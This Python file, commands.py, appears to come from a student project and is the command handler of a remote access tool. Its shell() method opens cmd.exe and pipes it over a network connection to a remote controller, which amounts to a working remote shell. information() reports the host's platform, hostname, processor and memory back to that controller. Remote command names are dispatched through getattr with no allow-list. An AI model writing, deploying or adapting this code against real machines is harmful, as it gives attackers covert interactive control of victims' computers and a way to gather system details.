# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    commands.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: TheRed <TheRed@students.42.fr>             +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/22 00:20:32 by TheRed            #+#    #+#              #
#    Updated: 2024/07/22 00:20:32 by TheRed           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import subprocess
import threading
import platform
import psutil
import socket
import json

class Command:
	def __init__(self, client) -> None:
		from client import Client

		self.client:	Client = client

	def command(self, command_name: str, args: list) -> None:
		command_list = dir(self)
		
		if command_name in command_list:
			getattr(self, command_name)(args)

	def shell(self, args: list) -> None:
		shell = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

		def send_output(pipe, client):
			while True:
				output = pipe.read(1)
				if not output:
					break
				client.send(output, encoding=False)

		threading.Thread(target=send_output, args=[shell.stdout, self.client], daemon=True).start()
		threading.Thread(target=send_output, args=(shell.stderr, self.client), daemon=True).start()

		while True:
			try:
				data = self.client.recv()
				if (data == "EXIT"):
					break

				if not data:
					break
				if (not data.endswith("\n")):
					data += "\n"
				shell.stdin.write(data.encode())
				shell.stdin.flush()
			except:
				break
		
		self.client.send("EXIT")
		shell.terminate()

	def information(self, args: list) -> None:
		info = {
			"platform": platform.platform(),
			"architecture": platform.architecture(),
			"processor": platform.processor(),
			"name": socket.gethostname(),
			"ram": f"{round(psutil.virtual_memory().used / (1024 ** 3), 2)} / {round(psutil.virtual_memory().total / (1024 ** 3))} GB",
		}
		self.client.send(json.dumps(info))
		
	def close(self, args: list) -> None:
		print("client closed")
		self.client.close()